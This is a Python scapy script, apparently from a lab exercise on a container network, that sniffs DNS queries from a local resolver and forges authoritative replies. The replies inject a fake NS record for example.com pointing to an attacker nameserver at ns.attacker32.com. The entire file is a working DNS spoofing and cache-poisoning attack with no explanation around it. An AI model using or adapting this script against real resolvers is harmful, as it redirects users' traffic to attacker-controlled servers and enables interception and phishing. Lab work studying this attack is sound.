#!/usr/bin/env python3
from scapy.all import *

# ----------------- CONFIG -----------------

LOCAL_DNS_IP = "10.9.0.53"
IFACE = "br-8eecaee5cc49"

TARGET_DOMAIN = "example.com"
FAKE_NS = "ns.attacker32.com."
FAKE_NS_IP = "10.9.0.153"   # attacker-ns container

# ------------------------------------------


def spoof_ns(pkt):
    if DNS in pkt and pkt[DNS].qd is not None and pkt[DNS].qr == 0:

        qname = pkt[DNS].qd.qname.decode()
        src_ip = pkt[IP].src

        if src_ip == LOCAL_DNS_IP and TARGET_DOMAIN in qname:
            print(f"[+] Intercepted DNS query for {qname.strip()} from local DNS")

            # Pretend to be the upstream server DNS was querying
            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
            udp = UDP(sport=53, dport=pkt[UDP].sport)

            # Authority section: fake NS record
            ns_record = DNSRR(
                rrname=TARGET_DOMAIN + ".",
                type='NS',
                ttl=300,
                rclass='IN',
                rdata=FAKE_NS
            )

            # Additional section: IP of attacker NS
            add_record = DNSRR(
                rrname=FAKE_NS,
                type='A',
                ttl=300,
                rclass='IN',
                rdata=FAKE_NS_IP
            )

            dns = DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=pkt[DNS].qd,
                ns=ns_record,
                ar=add_record,
                nscount=1,
                arcount=1
            )

            spoofpkt = ip / udp / dns

            print(f"[+] Sending spoofed NS reply: {TARGET_DOMAIN} → {FAKE_NS} ({FAKE_NS_IP})")
            send(spoofpkt, iface=IFACE, verbose=0)


def main():
    myFilter = f"udp port 53 and src host {LOCAL_DNS_IP}"

    print(f"[*] Sniffing on interface: {IFACE}")
    print(f"[*] Using filter: {myFilter}")
    print("[*] Waiting for DNS queries from local DNS...")

    sniff(
        iface=IFACE,
        filter=myFilter,
        prn=spoof_ns,
        store=0
    )


if __name__ == "__main__":
    main()
